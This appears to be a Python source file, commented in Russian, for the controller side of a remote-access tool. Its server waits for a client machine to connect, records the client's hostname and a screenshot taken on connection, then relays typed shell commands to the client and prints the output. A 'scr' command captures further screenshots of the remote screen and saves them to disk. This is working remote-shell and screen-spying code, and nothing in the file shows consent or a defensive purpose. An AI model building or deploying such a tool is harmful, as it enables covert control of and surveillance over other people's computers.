import sys
import os
import time
from SOCKETv4_TCP import Socket, SocketErrors

specific_commands = ('cls', 'cd', 'exit', 'scr')


class Server(Socket):
    """
    Класс сервера. Работает с <class Client>. Принимает и парсит данные.

    Python ver. = 3.9
    """

    cwd: str
    client_hostname: str
    _client: Socket

    __slots__ = ('cwd', '_client', 'client_hostname')

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.cwd = None
        self._client = None
        self.client_hostname = None

    def createServer(self) -> None:
        """ Создает сервер.

        :return: None
        """
        self.bind(5)

    def startServer(self) -> None:
        """ Ждет подключения клиента, получает начальную информацию об подключившимся.

        :return: None
        """
        while True:
            try:
                print('Жду подключения...')
                self._client, address_info = self.accept()
                client_ip, client_port = address_info

                # Принятие  hostname клиента
                self.client_hostname = self.getResponse()
                print(f"Hostname: {self.client_hostname} подключен!\n"
                      f"IP: {client_ip} Port: {client_port}\n")

                self.run()
            except (SocketErrors, KeyboardInterrupt) as Exc:
                if isinstance(Exc, KeyboardInterrupt):
                    print('Вы выключили сервер! Когда кто то подключился)')
                else:
                    print('Ошибка при подключении нового клиента!', Exc)
                break

    def run(self) -> None:
        """ Отправляет и обрабатывает команды в цикле.

        :return: None
        """

        def _init_screen(client_hostname: str, data: bytes) -> None:
            """ Инициализирует скрин нового клиента.
            Если этот клиент уже был подключен, создается новый скрин с другим номером.

            :param client_hostname: Имя машины клиента.
            :param data: bytes - Данные скриншота.
            :return: None
            """
            user_name_file = f'{client_hostname}_0.png'
            i = 0
            while os.path.exists(fr'img\raw\{user_name_file}'):
                i += 1
                user_name_file = f'{client_hostname}_{i}.png'

            with open(fr'img\raw\{user_name_file}', 'wb') as f:
                f.write(data)

        screen = self._client.recv(decode=False)
        _init_screen(self.client_hostname, screen)

        try:
            while True:
                command = input(f'{self.cwd}>')

                what_next = self.commandHandler(command)

                if what_next == str():
                    pass
                elif what_next == 'continue':
                    continue
                elif what_next == 'break':
                    break

                self._client.sendall(command)
                response = self.getResponse()

                print(response)
        except KeyboardInterrupt:
            self._client.close()
            print('\n\nВы выключили сервер!')
            sys.exit()

    def getResponse(self, *args, **kwargs) -> str:
        """ Возвращает ответ от клиента в виде строки. Если произошла ошибка, ответ будет в виде ошибки

        :return: str
        """
        result = str()
        try:
            result, self.cwd = self._client.recv(*args, **kwargs).split(self.sep)
        except ValueError as E:
            result = str(E)
        finally:
            return result

    def commandHandler(self, command) -> str:
        """ Отлавливает кастомные команды, или команды невозможные к реализации через сеть (почти).
         Если после команды нужно продолжить поток заново, то возвращается 'continue',
         Если после команды нужно прекратить поток, то возвращается 'break',
         Если после команды можно продолжить поток, возвращается ''.

        :param command: Команда.
        :return: str
        """
        for spec_command in specific_commands:
            if spec_command in command.lower():
                break
        else:
            return str()

        if command.lower() == 'exit':
            self._client.close()
            print(f'Вы отключили Hostname: {self.client_hostname}')
            return 'break'

        elif command.lower() == 'cls':
            print('\n' * 30)
            return 'continue'

        elif command.lower() == 'scr':
            self._client.sendall(b'scr')
            screen = self._client.recv(decode=False)
            with open(name := fr'img\current\{time.time()}.png', 'wb') as f:
                f.write(screen)
            print(f'Скрин сохранён как: {name}')
            return 'continue'

        elif 'cd' == command.split()[0].lower() and not command.split()[1:]:
            return 'continue'


if __name__ == '__main__':
    server = Server(addr='192.168.0.10', port=13445)
    server.createServer()
    server.startServer()
